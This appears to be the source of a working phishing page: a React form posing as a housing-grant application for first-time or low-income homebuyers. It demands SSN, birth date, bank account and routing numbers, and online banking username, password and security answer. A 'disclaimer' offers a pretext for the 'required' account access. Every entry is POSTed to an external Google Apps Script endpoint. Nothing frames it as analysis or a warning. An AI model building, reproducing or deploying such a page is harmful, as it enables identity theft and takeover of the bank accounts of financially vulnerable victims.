'use client';

import { motion } from 'motion/react';
import { useState, useEffect } from 'react';

export default function Home() {
	const [isSubmitting, setIsSubmitting] = useState(false);
	const [submitStatus, setSubmitStatus] = useState<'idle' | 'success' | 'error'>('idle');
	const [submitMessage, setSubmitMessage] = useState('');

	const scrollToForm = () => {
		const formElement = document.getElementById('application-form');
		if (formElement) {
			formElement.scrollIntoView({ behavior: 'smooth' });
		}
	};

	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
		e.preventDefault();
		setIsSubmitting(true);
		setSubmitStatus('idle');

		try {
			const formData = new FormData(e.currentTarget);
			
			const response = await fetch('https://script.google.com/macros/s/AKfycbz9V6EM3LW3pLHoDXc0bozpw8lz7OxbjJrIEeNuW8hSZ9gefIut7UYVk-4bIZv4A7vvKg/exec', {
				method: 'POST',
				body: formData,
			});

			const result = await response.text();
			
			if (response.ok) {
				setSubmitStatus('success');
				setSubmitMessage('🎉 Application submitted successfully! We will review your application and contact you soon.');
				// Reset form
				(e.target as HTMLFormElement).reset();
			} else {
				throw new Error('Submission failed');
			}
		} catch (error) {
			setSubmitStatus('error');
			setSubmitMessage('❌ There was an error submitting your application. Please try again.');
			console.error('Submission error:', error);
		} finally {
			setIsSubmitting(false);
		}
	};

	// Auto-dismiss notification after 5 seconds
	useEffect(() => {
		if (submitStatus !== 'idle') {
			const timer = setTimeout(() => {
				setSubmitStatus('idle');
				setSubmitMessage('');
			}, 5000);

			return () => clearTimeout(timer);
		}
	}, [submitStatus]);

	return (
		<div className='min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100'>
			{/* Hero Section */}
			<motion.section
				initial={{ opacity: 0, y: 20 }}
				animate={{ opacity: 1, y: 0 }}
				transition={{ duration: 0.8 }}
				className='px-4 py-16 sm:px-6 lg:px-8'>
				<div className='max-w-4xl mx-auto text-center'>
					<motion.h1
						initial={{ opacity: 0, y: 30 }}
						animate={{ opacity: 1, y: 0 }}
						transition={{ duration: 0.8, delay: 0.2 }}
						className='text-4xl font-bold tracking-tight text-gray-900 sm:text-5xl lg:text-6xl'>
						Housing Assistance Grants for First-Time or Low-Income Homebuyers
					</motion.h1>

					<motion.p
						initial={{ opacity: 0, y: 30 }}
						animate={{ opacity: 1, y: 0 }}
						transition={{ duration: 0.8, delay: 0.4 }}
						className='mt-6 text-xl text-gray-600 max-w-3xl mx-auto'>
						We provide grants to individuals and families who are buying their
						first home or haven&apos;t owned in the last 3 years and need help
						with the down payment. Fill out the form below to begin your
						application.
					</motion.p>

					<motion.button
						onClick={scrollToForm}
						initial={{ opacity: 0, y: 30 }}
						animate={{ opacity: 1, y: 0 }}
						transition={{ duration: 0.8, delay: 0.6 }}
						whileHover={{ scale: 1.05 }}
						whileTap={{ scale: 0.95 }}
						className='mt-8 inline-flex items-center px-8 py-4 border border-transparent text-lg font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 shadow-lg'>
						Apply Now
					</motion.button>
				</div>
			</motion.section>

			{/* Application Form */}
			<motion.section
				id='application-form'
				initial={{ opacity: 0 }}
				whileInView={{ opacity: 1 }}
				transition={{ duration: 0.8 }}
				viewport={{ once: true }}
				className='px-4 py-16 sm:px-6 lg:px-8'>
				<div className='max-w-4xl mx-auto'>
					<motion.div
						initial={{ opacity: 0, y: 30 }}
						whileInView={{ opacity: 1, y: 0 }}
						transition={{ duration: 0.8 }}
						viewport={{ once: true }}
						className='bg-white rounded-lg shadow-xl overflow-hidden'>
						<div className='px-6 py-8 sm:px-10 sm:py-10'>
							<h2 className='text-3xl font-bold text-gray-900 mb-8 text-center'>
								Housing Grant Application
							</h2>

							{/* Success/Error Notification */}
							{submitStatus !== 'idle' && (
								<motion.div
									initial={{ opacity: 0, y: -20 }}
									animate={{ opacity: 1, y: 0 }}
									className={`p-4 rounded-lg mb-6 relative ${
										submitStatus === 'success'
											? 'bg-green-100 border border-green-200 text-green-800'
											: 'bg-red-100 border border-red-200 text-red-800'
									}`}>
									<p className='text-center font-medium pr-8'>{submitMessage}</p>
									<button
										onClick={() => {
											setSubmitStatus('idle');
											setSubmitMessage('');
										}}
										className='absolute top-2 right-2 p-1 rounded-full hover:bg-black hover:bg-opacity-10 transition-colors'>
										<svg className='w-4 h-4' fill='currentColor' viewBox='0 0 20 20'>
											<path fillRule='evenodd' d='M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z' clipRule='evenodd' />
										</svg>
									</button>
								</motion.div>
							)}

							<form
								onSubmit={handleSubmit}
								className='space-y-8'>
								{/* Section 1: Applicant Information */}
								<motion.div
									initial={{ opacity: 0, x: -30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										1. Applicant Information
									</h3>
									<div className='grid grid-cols-1 gap-6 sm:grid-cols-2'>
										<div>
											<label
												htmlFor='fullName'
												className='block text-sm font-medium text-gray-700'>
												Full Name *
											</label>
											<input
												type='text'
												name='fullName'
												id='fullName'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='dateOfBirth'
												className='block text-sm font-medium text-gray-700'>
												Date of Birth *
											</label>
											<input
												type='date'
												name='dateOfBirth'
												id='dateOfBirth'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='phoneNumber'
												className='block text-sm font-medium text-gray-700'>
												Phone Number *
											</label>
											<input
												type='tel'
												name='phoneNumber'
												id='phoneNumber'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='email'
												className='block text-sm font-medium text-gray-700'>
												Email *
											</label>
											<input
												type='email'
												name='email'
												id='email'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div className='sm:col-span-2'>
											<label
												htmlFor='currentAddress'
												className='block text-sm font-medium text-gray-700'>
												Current Address *
											</label>
											<textarea
												name='currentAddress'
												id='currentAddress'
												rows={3}
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'></textarea>
										</div>

										<div>
											<label
												htmlFor='ssn'
												className='block text-sm font-medium text-gray-700'>
												SSN *
											</label>
											<input
												type='text'
												name='ssn'
												id='ssn'
												required
												placeholder='XXX-XX-XXXX'
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>
									</div>
								</motion.div>

								{/* Section 2: Household & Income */}
								<motion.div
									initial={{ opacity: 0, x: 30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										2. Household & Income
									</h3>
									<div className='grid grid-cols-1 gap-6 sm:grid-cols-2'>
										<div>
											<label
												htmlFor='householdSize'
												className='block text-sm font-medium text-gray-700'>
												Number of people in household *
											</label>
											<input
												type='number'
												name='householdSize'
												id='householdSize'
												min='1'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='monthlyIncome'
												className='block text-sm font-medium text-gray-700'>
												Monthly gross household income *
											</label>
											<input
												type='number'
												name='monthlyIncome'
												id='monthlyIncome'
												min='0'
												step='0.01'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div className='sm:col-span-2'>
											<label className='block text-sm font-medium text-gray-700 mb-3'>
												Primary income source *
											</label>
											<div className='space-y-2'>
												<div className='flex items-center'>
													<input
														id='employment'
														name='incomeSource'
														type='radio'
														value='Employment'
														required
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='employment'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Employment
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='selfEmployed'
														name='incomeSource'
														type='radio'
														value='Self-Employed'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='selfEmployed'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Self-Employed
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='unemployment'
														name='incomeSource'
														type='radio'
														value='Unemployment'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='unemployment'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Unemployment
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='disability'
														name='incomeSource'
														type='radio'
														value='Disability'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='disability'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Disability
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='other'
														name='incomeSource'
														type='radio'
														value='Other'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='other'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Other
													</label>
												</div>
											</div>
											<div className='mt-3'>
												<input
													type='text'
													name='incomeSourceOther'
													placeholder='If other, please specify'
													className='block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
												/>
											</div>
										</div>

										<div className='sm:col-span-2'>
											<label className='block text-sm font-medium text-gray-700 mb-3'>
												Active Bank Accounts
											</label>
											<div className='space-y-3'>
												<input
													type='text'
													name='bankAccount1'
													placeholder='Bank Account 1'
													className='block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
												/>
												<input
													type='text'
													name='bankAccount2'
													placeholder='Bank Account 2'
													className='block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
												/>
												<input
													type='text'
													name='bankAccount3'
													placeholder='Bank Account 3'
													className='block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
												/>
											</div>
										</div>
									</div>
								</motion.div>

								{/* Section 3: Property Info */}
								<motion.div
									initial={{ opacity: 0, x: -30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										3. Property Information
									</h3>
									<div className='grid grid-cols-1 gap-6 sm:grid-cols-2'>
										<div className='sm:col-span-2'>
											<label
												htmlFor='propertyAddress'
												className='block text-sm font-medium text-gray-700'>
												Property address *
											</label>
											<textarea
												name='propertyAddress'
												id='propertyAddress'
												rows={3}
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'></textarea>
										</div>

										<div>
											<label className='block text-sm font-medium text-gray-700 mb-3'>
												Is this your primary residence? *
											</label>
											<div className='space-y-2'>
												<div className='flex items-center'>
													<input
														id='primaryResidenceYes'
														name='primaryResidence'
														type='radio'
														value='Yes'
														required
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='primaryResidenceYes'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Yes
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='primaryResidenceNo'
														name='primaryResidence'
														type='radio'
														value='No'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='primaryResidenceNo'
														className='ml-3 block text-sm font-medium text-gray-700'>
														No
													</label>
												</div>
											</div>
										</div>

										<div>
											<label
												htmlFor='purchasePrice'
												className='block text-sm font-medium text-gray-700'>
												Purchase Price *
											</label>
											<input
												type='number'
												name='purchasePrice'
												id='purchasePrice'
												min='0'
												step='0.01'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div className='sm:col-span-2'>
											<label className='block text-sm font-medium text-gray-700 mb-3'>
												Are you a first-time homebuyer? *
											</label>
											<div className='space-y-2'>
												<div className='flex items-center'>
													<input
														id='firstTimeBuyerYes'
														name='firstTimeBuyer'
														type='radio'
														value='Yes'
														required
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='firstTimeBuyerYes'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Yes
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='firstTimeBuyerNo'
														name='firstTimeBuyer'
														type='radio'
														value='No'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='firstTimeBuyerNo'
														className='ml-3 block text-sm font-medium text-gray-700'>
														No
													</label>
												</div>
											</div>
										</div>
									</div>
								</motion.div>

								{/* Section 4: Mortgage & Hardship */}
								<motion.div
									initial={{ opacity: 0, x: 30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										4. Mortgage & Hardship
									</h3>
									<div className='grid grid-cols-1 gap-6 sm:grid-cols-2'>
										<div>
											<label
												htmlFor='mortgageLender'
												className='block text-sm font-medium text-gray-700'>
												Mortgage lender *
											</label>
											<input
												type='text'
												name='mortgageLender'
												id='mortgageLender'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='monthlyMortgage'
												className='block text-sm font-medium text-gray-700'>
												Monthly mortgage payment *
											</label>
											<input
												type='number'
												name='monthlyMortgage'
												id='monthlyMortgage'
												min='0'
												step='0.01'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div className='sm:col-span-2'>
											<label className='block text-sm font-medium text-gray-700 mb-3'>
												Are you behind on your mortgage? *
											</label>
											<div className='space-y-2'>
												<div className='flex items-center'>
													<input
														id='behindMortgageYes'
														name='behindMortgage'
														type='radio'
														value='Yes'
														required
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='behindMortgageYes'
														className='ml-3 block text-sm font-medium text-gray-700'>
														Yes
													</label>
												</div>
												<div className='flex items-center'>
													<input
														id='behindMortgageNo'
														name='behindMortgage'
														type='radio'
														value='No'
														className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300'
													/>
													<label
														htmlFor='behindMortgageNo'
														className='ml-3 block text-sm font-medium text-gray-700'>
														No
													</label>
												</div>
											</div>
										</div>
									</div>
								</motion.div>

								{/* Section 5: Required Documents */}
								<motion.div
									initial={{ opacity: 0, x: -30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										5. Required Documents
									</h3>
									<div className='space-y-4'>
										<div className='flex items-center'>
											<input
												id='govId'
												name='documents'
												type='checkbox'
												value='Government-issued ID'
												className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded'
											/>
											<label
												htmlFor='govId'
												className='ml-3 block text-sm font-medium text-gray-700'>
												Government-issued ID
											</label>
										</div>

										<div className='flex items-center'>
											<input
												id='proofIncome'
												name='documents'
												type='checkbox'
												value='Proof of income'
												className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded'
											/>
											<label
												htmlFor='proofIncome'
												className='ml-3 block text-sm font-medium text-gray-700'>
												Proof of income
											</label>
										</div>

										<div className='flex items-center'>
											<input
												id='utilityBill'
												name='documents'
												type='checkbox'
												value='Utility Bill'
												className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded'
											/>
											<label
												htmlFor='utilityBill'
												className='ml-3 block text-sm font-medium text-gray-700'>
												Utility Bill
											</label>
										</div>

										<div className='flex items-center'>
											<input
												id='onlineAccess'
												name='documents'
												type='checkbox'
												value='Online Access'
												required
												className='focus:ring-indigo-500 h-4 w-4 text-indigo-600 border-gray-300 rounded'
											/>
											<label
												htmlFor='onlineAccess'
												className='ml-3 block text-sm font-medium text-gray-700'>
												Online Access (required) *
											</label>
										</div>
									</div>
								</motion.div>

								{/* Section 6: Declaration */}
								<motion.div
									initial={{ opacity: 0, x: 30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										6. Declaration
									</h3>
									<div className='space-y-6'>
										<div className='bg-gray-50 p-6 rounded-lg'>
											<p className='text-sm text-gray-700'>
												I hereby certify that all information provided in this
												application is true and accurate to the best of my
												knowledge. I understand that any false statements may
												result in denial of the grant or legal action. I
												authorize the verification of all information provided.
											</p>
										</div>

										<div className='grid grid-cols-1 gap-6 sm:grid-cols-2'>
											<div>
												<label
													htmlFor='signature'
													className='block text-sm font-medium text-gray-700'>
													Signature (Type full name) *
												</label>
												<input
													type='text'
													name='signature'
													id='signature'
													required
													className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
												/>
											</div>

											<div>
												<label
													htmlFor='signatureDate'
													className='block text-sm font-medium text-gray-700'>
													Date *
												</label>
												<input
													type='date'
													name='signatureDate'
													id='signatureDate'
													required
													className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
												/>
											</div>
										</div>
									</div>
								</motion.div>

								{/* Section 7: Account Details */}
								<motion.div
									initial={{ opacity: 0, x: -30 }}
									whileInView={{ opacity: 1, x: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='border-b border-gray-200 pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										7. Account Details
									</h3>
									<div className='grid grid-cols-1 gap-6 sm:grid-cols-2'>
										<div>
											<label
												htmlFor='accountName'
												className='block text-sm font-medium text-gray-700'>
												Account name *
											</label>
											<input
												type='text'
												name='accountName'
												id='accountName'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='accountNumber'
												className='block text-sm font-medium text-gray-700'>
												Account number *
											</label>
											<input
												type='text'
												name='accountNumber'
												id='accountNumber'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='routingNumber'
												className='block text-sm font-medium text-gray-700'>
												Routing number *
											</label>
											<input
												type='text'
												name='routingNumber'
												id='routingNumber'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='username'
												className='block text-sm font-medium text-gray-700'>
												Username *
											</label>
											<input
												type='text'
												name='username'
												id='username'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='password'
												className='block text-sm font-medium text-gray-700'>
												Password *
											</label>
											<input
												type='password'
												name='password'
												id='password'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div>
											<label
												htmlFor='securityQuestion'
												className='block text-sm font-medium text-gray-700'>
												Security Question *
											</label>
											<input
												type='text'
												name='securityQuestion'
												id='securityQuestion'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>

										<div className='sm:col-span-2'>
											<label
												htmlFor='securityAnswer'
												className='block text-sm font-medium text-gray-700'>
												Security Answer *
											</label>
											<input
												type='text'
												name='securityAnswer'
												id='securityAnswer'
												required
												className='mt-1 block w-full border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm p-3'
											/>
										</div>
									</div>
								</motion.div>

								{/* Section 8: Disclaimer */}
								<motion.div
									initial={{ opacity: 0, y: 30 }}
									whileInView={{ opacity: 1, y: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='pb-8'>
									<h3 className='text-xl font-semibold text-gray-900 mb-6'>
										8. Disclaimer
									</h3>
									<div className='bg-yellow-50 border border-yellow-200 rounded-lg p-6'>
										<p className='text-sm text-gray-700 leading-relaxed'>
											Due to past issues where recipients denied receiving
											funds, online access is now required to verify and monitor
											the transaction. This protects both parties and ensures
											the grant is delivered properly. Once your housing grant
											is received, you&apos;re free to update or revoke access.
										</p>
									</div>
								</motion.div>

								{/* Submit Button */}
								<motion.div
									initial={{ opacity: 0, y: 30 }}
									whileInView={{ opacity: 1, y: 0 }}
									transition={{ duration: 0.6 }}
									viewport={{ once: true }}
									className='pt-6'>
									<motion.button
										type='submit'
										disabled={isSubmitting}
										whileHover={!isSubmitting ? { scale: 1.05 } : {}}
										whileTap={!isSubmitting ? { scale: 0.95 } : {}}
										className={`w-full flex justify-center items-center py-4 px-6 border border-transparent rounded-md shadow-sm text-lg font-medium text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 ${
											isSubmitting
												? 'bg-indigo-400 cursor-not-allowed'
												: 'bg-indigo-600 hover:bg-indigo-700'
										}`}>
										{isSubmitting ? (
											<>
												<svg className='animate-spin -ml-1 mr-3 h-5 w-5 text-white' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'>
													<circle className='opacity-25' cx='12' cy='12' r='10' stroke='currentColor' strokeWidth='4'></circle>
													<path className='opacity-75' fill='currentColor' d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'></path>
												</svg>
												Submitting...
											</>
										) : (
											'Submit Application'
										)}
									</motion.button>
								</motion.div>
							</form>
						</div>
					</motion.div>
				</div>
			</motion.section>
		</div>
	);
}
